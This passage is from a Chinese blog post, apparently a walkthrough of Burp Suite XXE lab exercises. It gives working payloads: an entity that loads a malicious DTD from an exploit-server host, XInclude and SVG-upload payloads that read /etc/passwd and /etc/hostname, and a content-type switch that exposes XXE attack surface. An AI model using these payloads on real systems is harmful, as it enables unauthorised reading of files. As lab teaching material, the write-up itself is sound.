+<p>加载一个不存在的文件来触发报错，并记下您的恶意 DTD 的 URL放入下面的payload中</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;https://exploit-0ae40000031ffda9c41c097e019d0097.exploit-server.net/xxe.dta&#34;&gt; %xxe;]&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241149992.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241149992.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241149992.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241149992.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241149992.png"
+        title="image-20221224114935940" /></p>
+<p>我们成功通过报错信息泄漏敏感文件内容了</p>
+<h2 id="利用-xinclude-检索文件">利用 XInclude 检索文件</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241035595.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241035595.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241035595.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241035595.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241035595.png"
+        title="image-20221224103509535" /></p>
+<h3 id="xinclude攻击">XInclude攻击</h3>
+<p>有些应用程序的服务端会将从客户端接收的内容嵌入到XML文档中然后解析，这就导致因为我们无法控制整个XML文档而无法发动常规的XXE攻击，但是我们可以通过XInclude在该XML文档中构建子XML文档，想要使用XInclude我们需要引入相应的命名空间，所以XInclude攻击的payload长这样</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>抓包后是</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241036961.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241036961.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241036961.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241036961.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241036961.png"
+        title="image-20221224103627926" /></p>
+<p>payload是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>productId=<span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span><span style="color:#960050;background-color:#1e0010">&amp;</span>storeId=1
+</span></span></code></pre></div><h2 id="通过图像文件上传利用-xxe">通过图像文件上传利用 XXE</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241055143.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241055143.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241055143.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241055143.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241055143.png"
+        title="image-20221224105529105" /></p>
+<p>SVG 是一种基于 XML 语法的图像格式</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241056393.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241056393.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241056393.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241056393.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241056393.png"
+        title="image-20221224105608363" /></p>
+<p>评论有个头像上传点，我们目的是通过上传payload的svg图像来执行命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span><span style="color:#f92672">&gt;&lt;text</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;16&#34;</span><span style="color:#f92672">&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/text&gt;&lt;/svg&gt;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241059131.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241059131.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241059131.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241059131.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241059131.png"
+        title="image-20221224105956077" /></p>
+<p>可以看到头像成功回显出信息</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241100704.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241100704.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241100704.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241100704.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202212241100704.png"
+        title="image-20221224110049674" /></p>
+<h2 id="通过修改内容类型的-xxe-攻击">通过修改内容类型的 XXE 攻击</h2>
+<p>大多数 POST 请求使用由 HTML 表单生成的默认内容类型，例如<code>application/x-www-form-urlencoded</code>. 一些网站希望接收这种格式的请求，但会容忍其他内容类型，包括 XML。</p>
+<p>例如，如果一个普通请求包含以下内容：</p>
+<pre tabindex="0"><code>POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+</code></pre><p>然后您可以提交以下请求，并得到相同的结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
+</span></span><span style="display:flex;"><span>Content-Type: text/xml
+</span></span><span style="display:flex;"><span>Content-Length: 52
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span><span style="color:#f92672">&lt;foo&gt;</span>bar<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>如果应用程序容忍消息正文中包含 XML 的请求，并将正文内容解析为 XML，那么只需将请求重新格式化为使用 XML 格式，您就可以到达隐藏的 XXE 攻击面。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" data-title="burpsuite靶场XXE" data-hashtags="xxe"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" data-hashtag="xxe"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" data-title="burpsuite靶场XXE"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" data-title="burpsuite靶场XXE"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" data-title="burpsuite靶场XXE"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/xxe/">Xxe</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BA%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" class="prev" rel="prev" title="burpsuite靶场请求走私"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>burpsuite靶场请求走私</a>
+            <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" class="next" rel="next" title="burpsuite靶场ssrf">burpsuite靶场ssrf<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
